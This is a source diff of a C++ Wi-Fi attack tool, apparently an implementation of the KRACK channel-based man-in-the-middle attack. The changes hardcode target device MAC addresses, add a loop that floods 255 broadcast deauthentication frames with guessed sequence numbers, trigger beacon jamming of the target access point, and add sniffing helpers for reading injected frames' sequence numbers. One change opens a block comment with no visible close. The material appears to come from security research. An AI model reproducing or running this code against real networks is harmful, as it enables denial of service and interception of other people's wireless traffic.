@@ -46,10 +46,11 @@
 #include "SeqnumStats.h"
 #include "KrackState.h"
 
-//#define FIXED_CLIENT_LIST
+#define FIXED_CLIENT_LIST
 
 #ifdef FIXED_CLIENT_LIST
-const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x00\xc0\xca\x62\xa4\xf6";
+const uint8_t *CLIENTMAC_PIXEL = (uint8_t*)"\x40\x4e\x36\x8c\x4f\x85";
+const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x18\x1e\xb0\x36\x5d\x4d";
 const uint8_t *CLIENTMAC_ALFA = (uint8_t*)"\x90\x18\x7c\x6e\x6b\x20";
 #endif
 
@@ -119,6 +120,8 @@ struct options_t
 
 	/** Injected chopchop'ed packet every X milliseconds */
 	int chopint;
+	/** seconds the reactive jammer is working */
+	size_t seconds;
 
 	uint8_t bssid[6];
 	char ssid[128];
@@ -257,6 +260,20 @@ static std::string packet_summary(uint8_t *buf, size_t buflen)
 		<< framesubtype(hdr->fc.type, hdr->fc.subtype) << ")";
 
 	return ss.str();
+}
+
+static bool is_injected_packet(uint8_t *buf, size_t buflen, void *data)
+{
+	const MacAddr *mac = (const MacAddr *)data;
+	ieee80211header *hdr = (ieee80211header*)buf;
+
+	if (buflen < IEEE80211_MINSIZE)
+		return false;
+
+	if (MacAddr(hdr->addr1) != *mac)
+		return false;
+
+	return true;
 }
 
 void clearstatus()
@@ -1064,7 +1081,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 			}
 		}
 	}
-
+/*
 	//
 	// 3. Check for Group message from AP to STA
 	//
@@ -1358,6 +1375,19 @@ int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
 	return proberesplen;
 }
 
+int get_last_seqnum(wi_dev *dev, uint8_t *addr)
+{
+	uint8_t buf[2048];
+	struct timespec timeout;
+	timeout.tv_sec = 0;
+	timeout.tv_nsec = 15 * 1000000;
+
+	int rval = osal_wi_sniff(dev, buf, sizeof(buf), is_injected_packet, &addr, &timeout);
+	if (rval <= 0)
+		return -1;
+	ieee80211header *hdr = (ieee80211header*) buf;
+	return hdr->sequence.seqnum;
+}
 
 int channelmitm(wi_dev *ap, wi_dev *clone)
 {
@@ -1412,9 +1442,10 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 	const uint8_t *clientmac;
 
 	// TODO: For now we MitM only these two clients
-	clientmac = CLIENTMAC_SAMSUNG;
-	client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
-	client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);
+	clientmac = CLIENTMAC_PIXEL;
+	client_list[MacAddr(CLIENTMAC_PIXEL)] = new ClientInfo(CLIENTMAC_PIXEL);
+	//client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
+	//client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);
 
 	// Set network and key info for all clients
 	for (auto it = client_list.begin(); it != client_list.end(); ++it)
@@ -1437,9 +1468,34 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 	tick.tv_nsec = 10 * 1000 * 1000;
 
 	if (global.jam) {
+#ifdef FIXED_CLIENT_LIST
+		// Deauth client
+		uint8_t buf[1024];
+		memset(buf, 0, sizeof(buf));
+		ieee80211header *hdr = (ieee80211header*) buf;
+		hdr->fc.type = 0;
+		hdr->fc.subtype = 12;
+		memcpy(hdr->addr1, "\xff\xff\xff\xff\xff\xff", 6); // Why can we deauth every client? o.O
+		memcpy(hdr->addr2, opt.bssid, 6);
+		memcpy(hdr->addr3, opt.bssid, 6);
+		hdr->sequence.seqnum = 0;
+		// FIXME Send probe request from breoadcast -> get multicast sequence number ->	deauth
+		std::cout << "Dirty deauth client" << std::endl;
+		for (int i=0; i<0xff; ++i)
+		{
+			// +2Bytes for deauth reason
+			if (osal_wi_write(ap, buf, sizeof(ieee80211header) + 2) < 0)
+				std::cerr <<  "Error sending deauth apckets" << std::endl;
+			++hdr->sequence.seqnum; // Guessing
+		}
+		std::cout << "Jam beacons of " << opt.ssid << " for " << opt.seconds << "sec" << std::endl;
+		osal_wi_jam_beacons(global.jam, opt.bssid, opt.seconds * 1000);
+#else		
 		std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
 		osal_wi_constantjam_start(global.jam);
 		global.isjamming = true;
+		
+#endif
 	}
 
 	std::cout << "[" << currentTime() << "]  " << "Started attack!" << std::endl;
@@ -1455,7 +1511,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 		clock_gettime(CLOCK_MONOTONIC, &now);
 		if (timespec_cmp(&time_next_beacon, &now) <= 0)
 		{
-			printf(".\n");
+			//printf(".\n");
 
 			// FIXME: This should actually be done in hardware!
 			fixedparams->timestamp = timespec_to_64us(&now);
@@ -1570,20 +1626,6 @@ int test_ack_generation(wi_dev *src, wi_dev *dst)
 	return 0;
 }
 
-
-static bool is_injected_packet(uint8_t *buf, size_t buflen, void *data)
-{
-	const MacAddr *mac = (const MacAddr *)data;
-	ieee80211header *hdr = (ieee80211header*)buf;
-
-	if (buflen < IEEE80211_MINSIZE)
-		return false;
-
-	if (MacAddr(hdr->addr1) != *mac)
-		return false;
-
-	return true;
-}
 
 int test_seqnum_injection(wi_dev *inject, wi_dev *monitor, int type, int subtype)
 {
@@ -1816,6 +1858,7 @@ int main(int argc, char *argv[])
 	if (opt.interface_jam[0]) {
 		if (osal_wi_open(opt.interface_jam, &jam) < 0) return 1;
 		global.jam = &jam;
+		opt.seconds = 3;
 	}
 
 	// Device configuation
@@ -1853,7 +1896,7 @@ int main(int argc, char *argv[])
 #else
 	// hardcoded for testing purposes
 	osal_wi_setchannel(&ap, 1);
-	osal_wi_setchannel(&clone, 13);
+	osal_wi_setchannel(&clone, 12);
 
 	// Note: opt.clonechan is based on channel of clone device if not specified by user
 #endif
